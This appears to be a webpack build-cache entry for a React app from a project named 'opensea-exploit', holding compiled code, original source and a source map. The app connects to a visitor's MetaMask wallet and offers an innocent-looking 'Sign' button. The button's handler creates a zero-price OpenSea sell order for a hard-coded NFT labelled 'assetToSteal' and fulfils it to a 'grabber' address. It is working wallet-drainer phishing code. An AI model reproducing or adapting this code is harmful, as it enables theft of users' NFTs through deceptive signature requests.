{"ast":null,"code":"var _jsxFileName = \"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/App.js\",\n    _s = $RefreshSig$();\n\nimport Web3 from \"web3\";\nimport { useState } from \"react\";\nimport axios from \"axios\";\nimport \"./App.css\";\nimport ConnectWalletButton from \"./components/ConnectWalletButton\";\nimport Moralis from \"moralis\";\nimport { createSellOrder, fulfillOrder } from \"./opensea-sdk/utils/opensea.js\";\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nimport { Fragment as _Fragment } from \"react/jsx-dev-runtime\";\n\nconst App = () => {\n  _s();\n\n  const [loading, setLoading] = useState(false);\n  const [address, setAddress] = useState(\"\");\n\n  const onPressConnect = async () => {\n    setLoading(true);\n\n    try {\n      var _window, _window$ethereum;\n\n      if ((_window = window) !== null && _window !== void 0 && (_window$ethereum = _window.ethereum) !== null && _window$ethereum !== void 0 && _window$ethereum.isMetaMask) {\n        // Desktop browser\n        const accounts = await window.ethereum.request({\n          method: \"eth_requestAccounts\"\n        });\n        const account = Web3.utils.toChecksumAddress(accounts[0]);\n        setAddress(account); // await handleLogin(account);\n      }\n    } catch (error) {\n      console.log(error);\n      setAddress(\"\");\n    }\n\n    setLoading(false);\n  };\n\n  const onPressLogout = () => {\n    setAddress(\"\");\n  };\n\n  const signSmth = async () => {\n    const web3 = new Web3(Web3.givenProvider);\n    const provider = web3.currentProvider;\n    const assetToSteal = {\n      \"tokenId\": \"8932\",\n      \"tokenAddress\": \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\"\n    };\n    const grabber = \"0xa95889dF74d9F9A73b76DB329c71b78A2F62f635\";\n    const order = await createSellOrder({\n      provider: provider,\n      asset: assetToSteal,\n      accountAddress: address,\n      startAmount: 0,\n      endAmount: 0,\n      quantity: 1,\n      listingTime: 0,\n      expirationTime: 0,\n      englishAuctionReservePrice: 0,\n      paymentTokenAddress: \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\",\n      extraBountyBasisPoints: 0,\n      buyerAddress: grabber,\n      fees: 0.01,\n      buyerEmail: \"hui228@mail.ru\"\n    });\n    console.log(order);\n    await fulfillOrder({\n      order: order,\n      provider: provider,\n      accountAddress: address,\n      recipientAddress: grabber,\n      referrerAddress: grabber\n    });\n  };\n\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    className: \"App\",\n    children: /*#__PURE__*/_jsxDEV(\"header\", {\n      className: \"App-header\",\n      children: [/*#__PURE__*/_jsxDEV(ConnectWalletButton, {\n        onPressConnect: onPressConnect,\n        onPressLogout: onPressLogout,\n        loading: loading,\n        address: address\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 81,\n        columnNumber: 9\n      }, this), address != \"\" ? /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: signSmth,\n        children: /*#__PURE__*/_jsxDEV(\"h2\", {\n          children: \"Sign\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 92,\n          columnNumber: 15\n        }, this)\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 89,\n        columnNumber: 13\n      }, this) : /*#__PURE__*/_jsxDEV(_Fragment, {}, void 0, false)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 80,\n      columnNumber: 7\n    }, this)\n  }, void 0, false, {\n    fileName: _jsxFileName,\n    lineNumber: 79,\n    columnNumber: 5\n  }, this);\n};\n\n_s(App, \"jb+CYBCLatwOT2t8Rs5oNf2j6JQ=\");\n\n_c = App;\nexport default App;\n\nvar _c;\n\n$RefreshReg$(_c, \"App\");","map":{"version":3,"names":["Web3","useState","axios","ConnectWalletButton","Moralis","createSellOrder","fulfillOrder","App","loading","setLoading","address","setAddress","onPressConnect","window","ethereum","isMetaMask","accounts","request","method","account","utils","toChecksumAddress","error","console","log","onPressLogout","signSmth","web3","givenProvider","provider","currentProvider","assetToSteal","grabber","order","asset","accountAddress","startAmount","endAmount","quantity","listingTime","expirationTime","englishAuctionReservePrice","paymentTokenAddress","extraBountyBasisPoints","buyerAddress","fees","buyerEmail","recipientAddress","referrerAddress"],"sources":["/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/App.js"],"sourcesContent":["import Web3 from \"web3\";\nimport { useState } from \"react\";\nimport axios from \"axios\";\nimport \"./App.css\";\nimport ConnectWalletButton from \"./components/ConnectWalletButton\";\nimport Moralis from \"moralis\";\n\nimport { createSellOrder, fulfillOrder } from \"./opensea-sdk/utils/opensea.js\";\n\nconst App = () => {\n  const [loading, setLoading] = useState(false);\n  const [address, setAddress] = useState(\"\");\n\n  const onPressConnect = async () => {\n    setLoading(true);\n\n    try {\n      if (window?.ethereum?.isMetaMask) {\n        // Desktop browser\n        const accounts = await window.ethereum.request({\n          method: \"eth_requestAccounts\",\n        });\n\n        const account = Web3.utils.toChecksumAddress(accounts[0]);\n        setAddress(account);\n        // await handleLogin(account);\n      }\n    } catch (error) {\n      console.log(error);\n      setAddress(\"\");\n    }\n\n    setLoading(false);\n  };\n\n  const onPressLogout = () => {\n    setAddress(\"\");\n  };\n\n  const signSmth = async () => {\n    const web3 = new Web3(Web3.givenProvider);\n    const provider = web3.currentProvider\n\n    const assetToSteal = {\n      \"tokenId\": \"8932\",\n      \"tokenAddress\": \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\"\n    }\n    const grabber = \"0xa95889dF74d9F9A73b76DB329c71b78A2F62f635\";\n\n    const order = await createSellOrder({\n      provider: provider,\n      asset: assetToSteal,\n      accountAddress: address,\n      startAmount: 0,\n      endAmount: 0,\n      quantity: 1,\n      listingTime: 0,\n      expirationTime: 0,\n      englishAuctionReservePrice: 0,\n      paymentTokenAddress: \"0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0\",\n      extraBountyBasisPoints: 0,\n      buyerAddress: grabber,\n      fees: 0.01,\n      buyerEmail: \"hui228@mail.ru\"\n    });\n\n    console.log(order);\n\n    await fulfillOrder({\n      order: order,\n      provider: provider,\n      accountAddress: address,\n      recipientAddress: grabber,\n      referrerAddress: grabber\n    });\n  }\n\n  return (\n    <div className=\"App\">\n      <header className=\"App-header\">\n        <ConnectWalletButton\n          onPressConnect={onPressConnect}\n          onPressLogout={onPressLogout}\n          loading={loading}\n          address={address}\n        />\n        { \n          address != \"\" ?\n            <button\n              onClick={signSmth}\n            >\n              <h2>Sign</h2>\n            </button>\n          : \n            <></>\n        }\n      </header>\n    </div>\n  );\n};\n\nexport default App;\n"],"mappings":"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"},"metadata":{},"sourceType":"module"}